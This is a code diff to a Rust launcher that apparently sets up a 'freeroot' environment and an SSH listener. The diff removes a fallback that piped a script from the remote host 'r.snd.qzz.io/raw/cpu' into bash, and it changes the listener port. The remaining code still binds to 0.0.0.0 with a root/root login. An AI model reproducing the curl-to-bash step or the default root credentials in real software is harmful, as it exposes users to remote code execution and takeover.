@@ -25,7 +25,6 @@ const URLS: &[&str] = &[
 const TMP: &str = "freeroot_temp";
 const DIR: &str = "work";
 const SH: &str = "noninteractive.sh";
-const FALLBACK_URL: &str = "r.snd.qzz.io/raw/cpu";
 
 struct Config {
     ssh_ip: String,
@@ -37,7 +36,7 @@ impl Config {
     fn load() -> Self {
         let mut config = Config {
             ssh_ip: "0.0.0.0".to_string(),
-            ssh_port: 24990,
+            ssh_port: 25565,
             users: HashMap::new(),
         };
         config.users.insert("root".to_string(), "root".to_string());
@@ -104,30 +103,6 @@ fn clone_repo() -> bool {
         }
     }
     false
-}
-
-fn fallback() -> bool {
-    if !check_command("curl") {
-        println!("[WARN] Curl not found, cannot use fallback");
-        return false;
-    }
-    println!("[INFO] Executing fallback: curl {} | bash", FALLBACK_URL);
-    
-    let status = Command::new("bash")
-        .arg("-c")
-        .arg(format!("curl {} | bash", FALLBACK_URL))
-        .status();
-
-    match status {
-        Ok(s) if s.success() => {
-            println!("[INFO] Fallback executed successfully");
-            true
-        }
-        _ => {
-            println!("[ERROR] Fallback failed");
-            false
-        }
-    }
 }
 
 fn execute_script(dir: &Path, script: &str) {
@@ -402,16 +377,8 @@ async fn main() {
     }
 
     if !clone_repo() {
-        println!("[WARN] All clone attempts failed, trying fallback method...");
-        let _ = delete_recursive(&tmp_dir);
-        if !fallback() {
-            eprintln!("[ERROR] Fallback method also failed");
-            std::process::exit(1);
-        }
-        println!("[INFO] Fallback method succeeded");
-        loop {
-            std::thread::sleep(Duration::from_secs(1));
-        }
+        eprintln!("[ERROR] All clone attempts failed");
+        std::process::exit(1);
     }
 
     let _ = fs::rename(&tmp_dir, &work_dir);
